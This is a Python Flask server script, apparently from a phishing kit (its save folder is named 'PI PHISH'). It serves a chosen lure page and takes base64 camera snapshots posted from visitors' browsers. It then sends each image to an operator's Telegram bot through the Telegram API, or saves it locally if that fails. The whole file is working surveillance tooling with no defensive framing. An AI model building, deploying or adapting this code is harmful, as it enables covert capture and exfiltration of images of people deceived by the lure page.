from flask import Flask, request, jsonify, send_from_directory
import base64
import requests
import io
import json
import os
from datetime import datetime

# ───────── COLORS ─────────
RED     = "\033[91m"
GREEN   = "\033[92m"
YELLOW  = "\033[93m"
CYAN    = "\033[96m"
WHITE   = "\033[97m"
RESET   = "\033[0m"
BOLD    = "\033[1m"

# ───────── Paths ─────────
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
CONFIG_FILE = os.path.join(BASE_DIR, "config.json")

LOCAL_SAVE_DIR = "/storage/emulated/0/PI PHISH"
os.makedirs(LOCAL_SAVE_DIR, exist_ok=True)

CAPTURE_COUNT = 0

# ───────── Load Config ─────────
def load_config():
    if not os.path.exists(CONFIG_FILE):
        return {}, None, None
    with open(CONFIG_FILE, "r") as f:
        cfg = json.load(f)
    return cfg, cfg.get("BOT_TOKEN"), cfg.get("CHAT_ID")

# ───────── Active HTML ─────────
def get_active_html():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r") as f:
            cfg = json.load(f)
            idx = cfg.get("ACTIVE_HTML", "2")
            return f"index{idx}.html"
    return "index2.html"

# ───────── Save Image ─────────
def save_local_image(image_bytes):
    filename = datetime.now().strftime("IMG_%Y%m%d_%H%M%S.jpg")
    path = os.path.join(LOCAL_SAVE_DIR, filename)

    with open(path, "wb") as f:
        f.write(image_bytes)

    return path

# ───────── Fancy Log ─────────
def log(msg, color=WHITE):
    time_str = datetime.now().strftime("%H:%M:%S")
    print(f"{CYAN}[{time_str}]{RESET} {color}{msg}{RESET}")

# ───────── App ─────────
app = Flask(__name__)

# ───────── Root ─────────
@app.route("/")
def index():
    return send_from_directory(BASE_DIR, get_active_html())

# ───────── Upload ─────────
@app.route("/upload", methods=["POST"])
def upload():
    global CAPTURE_COUNT
    cfg, BOT_TOKEN, CHAT_ID = load_config()

    try:
        data = request.json.get("image")
        if not data:
            return jsonify({"status": "error", "msg": "No image"}), 400

        header, encoded = data.split(",", 1)
        image_bytes = base64.b64decode(encoded)

        CAPTURE_COUNT += 1

        # ───── Telegram ─────
        if BOT_TOKEN and CHAT_ID:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"

            files = {
                "photo": ("capture.jpg", io.BytesIO(image_bytes))
            }

            payload = {
                "chat_id": CHAT_ID,
                "caption": f"📸 Capture ({get_active_html()})"
            }

            r = requests.post(url, data=payload, files=files, timeout=20)

            if r.status_code == 200:
                log(f"[{CAPTURE_COUNT}] 📸 CAM CAPTURE → TELEGRAM", GREEN)
                return jsonify({"status": "ok", "mode": "telegram"})

        # ───── Local Save ─────
        path = save_local_image(image_bytes)
        log(f"[{CAPTURE_COUNT}] 📸 CAM CAPTURE → LOCAL SAVE", YELLOW)

        return jsonify({
            "status": "saved_local",
            "path": path
        })

    except Exception as e:
        log(f"ERROR → {str(e)}", RED)
        return jsonify({"status": "error", "msg": str(e)}), 500

# ───────── Run ─────────
if __name__ == "__main__":
    print(BOLD + GREEN + """
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
   🚀 CAMERA SERVER ONLINE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
""" + RESET)

    print(CYAN + "📡 Listening for camera triggers..." + RESET)
    print(YELLOW + "👁 Waiting for incoming captures...\n" + RESET)

    app.run(host="0.0.0.0", port=8080)
